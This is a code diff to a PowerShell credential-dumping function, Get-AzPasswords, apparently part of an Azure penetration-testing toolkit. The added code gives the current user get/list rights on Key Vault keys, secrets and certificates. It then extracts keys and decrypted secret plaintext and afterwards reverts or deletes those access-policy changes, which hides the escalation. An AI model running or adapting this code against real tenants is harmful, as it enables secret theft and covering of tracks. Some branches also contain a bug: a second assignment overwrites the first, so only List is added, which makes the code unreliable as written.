@@ -66,6 +66,11 @@ Function Get-AzPasswords
         [String]$Keys = "Y",
 
         [parameter(Mandatory=$false,
+        HelpMessage="Add list and get rights for your user in the vault access policies.")]
+        [ValidateSet("Y","N")]
+        [String]$ModifyPolicies = "N",
+
+        [parameter(Mandatory=$false,
         HelpMessage="Dump App Services Configurations.")]
         [ValidateSet("Y","N")]
         [String]$AppServices = "Y",
@@ -114,7 +119,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies}
         break
     }
 
@@ -145,6 +150,124 @@ Function Get-AzPasswords
         foreach ($vault in $vaults){
             $vaultName = $vault.VaultName
 
+            Write-Verbose "Starting on the $vaultName Key Vault"
+
+            # Check list and read on the vault, add it if not there
+            if($ModifyPolicies -eq 'Y'){
+
+                $currentVault = Get-AzKeyVault -VaultName $vaultName
+
+                # Pulls current user ObjectID from LoginStatus
+                $currentOID = ($LoginStatus.Account.ExtendedProperties.HomeAccountId).split('.')[0]
+                                
+                # Base variable for reverting policies
+                $needsKeyRevert = $false
+                $needsSecretRevert = $false
+                $needsCleanup = $false
+
+                # If the OID is in the policies already, check if list/read available
+                if($currentVault.AccessPolicies.ObjectID -contains $currentOID){
+
+                    Write-Verbose "`tCurrent user has an existing access policy on the $vaultName vault"
+                    $userPolicy = ($currentVault.AccessPolicies | where ObjectID -Match $currentOID)
+
+                    # use the $userPolicy.PermissionsToKeys (non-str) to reset perms
+
+                    $keyPolicyStr = $userPolicy.PermissionsToKeysStr
+                    $secretPolicyStr = $userPolicy.PermissionsToSecretsStr
+                    $certPolicyStr = $userPolicy.PermissionsToCertificatesStr
+                                        
+                    #======================Keys======================
+                    # If not get, and not list try to add get and list
+                    if((!($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
+                        # Take Existing, append Get and List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"
+
+                        Write-Verbose "`t`tTrying to add Keys get/list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsKeyRevert = $true
+                    }
+                    # If not get, and list, then try to add get
+                    elseif((!($keyPolicyStr -match "Get")) -and (($keyPolicyStr -match "List"))){
+                        # Take Existing, append Get
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
+                        
+                        Write-Verbose "`t`tTrying to add Keys get access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsKeyRevert = $true
+
+                    }
+                    # If get, and not list, try to add list
+                    elseif((($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
+                        # Take Existing, append List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"
+
+                        Write-Verbose "`t`tTrying to add Keys list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
+                        
+                        # flag the need for clean up
+                        $needsKeyRevert = $true
+                    }
+                    else{Write-Verbose "`tCurrent user has Keys get/list access to the $vaultName vault"}
+
+                    #======================Secrets======================
+
+                    # If not get, and not list try to add get and list
+                    if((!($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
+                        # Take Existing, append Get and List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"
+
+                        Write-Verbose "`t`tTrying to add Secrets get/list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsSecretRevert = $true
+                    }
+                    # If not get, and list, then try to add get
+                    elseif((!($secretPolicyStr -match "Get")) -and (($secretPolicyStr -match "List"))){
+                        # Take Existing, append Get
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
+                        
+                        Write-Verbose "`t`tTrying to add Secrets get access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsSecretRevert = $true
+
+                    }
+                    # If get, and not list, try to add list
+                    elseif((($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
+                        # Take Existing, append List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"
+
+                        Write-Verbose "`t`tTrying to add Secrets list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
+                        
+                        # flag the need for clean up
+                        $needsSecretRevert = $true
+                    }
+                    else{Write-Verbose "`tCurrent user has Secrets get/list access in the to the $vaultName vault"}
+                }
+                                
+                # Else, just add new rights
+                else{
+                    Write-Verbose "`tCurrent user does not have an access policy entry in the $vaultName vault, adding get/list rights"
+
+                    # Add the read rights here
+                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys get,list -PermissionsToSecrets get,list -PermissionsToCertificates get,list
+
+                    # flag the need for clean up
+                    $needsCleanup = $true
+                }
+            }
+
+
             try{
                 $keylist = Get-AzKeyVaultKey -VaultName $vaultName -ErrorAction Stop
                                 
@@ -153,15 +276,17 @@ Function Get-AzPasswords
                 foreach ($key in $keylist){
                     $keyname = $key.Name
                     Write-Verbose "`t`tGetting Key value for the $keyname Key"
-                    $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
+                    Try{
+                        $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
             
-                    # Add Key to the table
-                    $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
+                        # Add Key to the table
+                        $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
+                    }
+                    catch{Write-Verbose "`t`t`tUnable to access the $keyname key"}
 
                 }
             }
             catch{Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"}
-            
 
             # Dump Secrets
             try{$secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
@@ -186,19 +311,37 @@ Function Get-AzPasswords
                     $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secretValue.SecretValue)
                     try {
                        $secretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
-                    } finally {
+                    } 
+                    finally {
                        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                     }
 
                     # Add Secret to the table
                     $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null
-
-                    }
-
+                }
                 Catch{Write-Verbose "`t`t`tUnable to export Secret value for $secretname"}
-
             }
 
+            # If key policies were changed, Revert them
+            if($needsKeyRevert){
+                Write-Verbose "`tReverting the Key Access Policies for the current user on the $vaultName vault"
+                # Revert the Keys, Secrets, and Certs policies
+                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $userPolicy.PermissionsToKeys
+            }
+
+            # If secrets policies were changed, Revert them
+            if($needsSecretRevert){
+                Write-Verbose "`tReverting the Secrets Access Policies for the current user on the $vaultName vault"
+                # Revert the Secrets policy
+                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $userPolicy.PermissionsToSecrets
+            }
+
+            # If Access Policy was added for your user, remove it
+            if($needsCleanup){
+                Write-Verbose "`tRemoving current user from the Access Policies for the $vaultName vault"
+                # Delete the user from the Access Policies
+                Remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID
+            }
         }
     }
 
